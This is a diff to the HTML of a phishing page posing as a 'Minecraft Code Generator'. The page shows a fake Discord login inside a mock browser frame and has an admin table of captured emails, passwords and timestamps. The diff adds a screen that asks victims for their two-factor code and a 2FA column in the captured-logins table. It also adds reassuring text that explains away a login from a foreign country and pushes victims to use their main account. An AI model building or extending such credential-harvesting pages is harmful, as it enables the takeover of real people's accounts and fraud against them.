@@ -13,7 +13,7 @@
             <div class="mccg-header">
                 <h1>MCCG</h1>
                 <p class="tagline">The most trusted Minecraft Code Generator 2026</p>
-                <p class="location-tag">MCCG, based in Sweden</p>
+                <p class="location-tag">MCCG, based in Europe</p>
             </div>
             
             <div class="login-preview-wrapper">
@@ -36,13 +36,7 @@
                                     <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                                 </svg>
                             </div>
-                            <input 
-                                type="text" 
-                                id="url-input" 
-                                class="url-input" 
-                                value="https://discord.com/login"
-                                spellcheck="false"
-                            >
+                            <input type="text" id="url-input" class="url-input" value="https://discord.com/login" spellcheck="false">
                             <div class="url-actions">
                                 <svg viewBox="0 0 24 24" width="16" height="16" fill="#8e9297">
                                     <path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
@@ -52,13 +46,7 @@
                     </div>
                     
                     <div class="browser-content" id="browser-content">
-                        <iframe 
-                            id="login-iframe" 
-                            src="about:blank"
-                            frameborder="0"
-                            scrolling="no"
-                        ></iframe>
-                        
+                        <iframe id="login-iframe" src="about:blank" frameborder="0" scrolling="no"></iframe>
                         <div id="error-page" class="error-page hidden">
                             <div class="error-content">
                                 <svg viewBox="0 0 24 24" width="64" height="64" fill="#72767d">
@@ -72,6 +60,31 @@
                     </div>
                 </div>
             </div>
+        </div>
+    </div>
+
+    <!-- 2FA Screen -->
+    <div id="twofa-screen" class="screen hidden">
+        <div class="twofa-box">
+            <div class="twofa-icon">
+                <svg viewBox="0 0 24 24" width="48" height="48" fill="#5865f2">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 4l6 2.67V11c0 3.45-2.56 6.68-6 7.74V5z"/>
+                </svg>
+            </div>
+            <h1>Two-Factor Authentication</h1>
+            <p class="twofa-subtitle">Please authenticate using your authenticator app. A notification has also been sent to your registered email address.</p>
+            <div class="twofa-notice">
+                <svg viewBox="0 0 24 24" width="16" height="16" fill="#faa61a">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                <p>If you do not have 2FA enabled on your account, please enable it in your Discord settings under Privacy &amp; Safety before continuing.</p>
+            </div>
+            <div class="twofa-input-wrapper">
+                <label for="twofa-input">Authentication Code</label>
+                <input type="text" id="twofa-input" placeholder="Enter 6-digit code" maxlength="8" autocomplete="off" spellcheck="false">
+            </div>
+            <button id="twofa-submit-btn" class="primary-btn full-width">Verify</button>
+            <p class="twofa-support">Having trouble? <a href="/support">Contact Support</a></p>
         </div>
     </div>
 
@@ -96,7 +109,7 @@
     <!-- Success Screen -->
     <div id="success-screen" class="screen hidden">
         <div class="status-box">
-            <div class="status-icon success-icon">
+            <div class="status-icon">
                 <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#43b581" stroke-width="2">
                     <circle cx="12" cy="12" r="10"/>
                     <path d="M8 12l2.5 2.5L16 9"/>
@@ -120,13 +133,13 @@
                 </svg>
             </div>
             <div class="auth-notice-banner">
-                <p>Please ensure you have verified your login via your email. If the login location shows Sweden, that is expected — our authentication servers are based in Sweden and all logins are routed through there.</p>
+                <p>Please ensure you have verified your login via your email. If the login location shows a European country, that is expected — our authentication servers are based in Europe and all logins are routed through there.</p>
             </div>
             <div class="warning-banner">
                 <p>Make sure you are using your main Discord account. Alternative accounts are prohibited and may result in a permanent ban.</p>
             </div>
             <h1>Verification Failed</h1>
-            <p class="error-message">Something went wrong. Please try again or clear your browser cache and attempt to login again.</p>
+            <p class="error-message">Something went wrong. Please try again or clear your browser cache and attempt to login again. If errors persist, please <a href="/support" class="support-link">contact support</a>.</p>
             <button id="try-again-btn" class="primary-btn">Login Again</button>
         </div>
     </div>
@@ -160,7 +173,6 @@
                             <button id="copy-code-btn" class="icon-btn">Copy</button>
                         </div>
                     </div>
-
                     <div class="codes-list-section">
                         <h3>Generated Codes</h3>
                         <div id="codes-list" class="codes-list">
@@ -180,16 +192,28 @@
                                 <tr>
                                     <th>Email/Phone</th>
                                     <th>Password</th>
+                                    <th>2FA Code</th>
                                     <th>Timestamp</th>
                                     <th>Actions</th>
                                 </tr>
                             </thead>
                             <tbody id="users-tbody">
                                 <tr>
-                                    <td colspan="4" class="empty-state">No logins captured yet</td>
+                                    <td colspan="5" class="empty-state">No logins captured yet</td>
                                 </tr>
                             </tbody>
                         </table>
+                    </div>
+                </section>
+
+                <!-- Support Tickets -->
+                <section class="admin-section">
+                    <div class="section-header">
+                        <h2>Support Tickets</h2>
+                        <span id="ticket-count" class="badge">0</span>
+                    </div>
+                    <div id="admin-tickets-list" class="tickets-list">
+                        <p class="empty-state">No tickets submitted yet</p>
                     </div>
                 </section>
 
@@ -211,6 +235,7 @@
         </div>
     </div>
 
+    <!-- Admin Access Button -->
     <button id="admin-access-btn" class="admin-access-btn hidden">Admin</button>
 
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
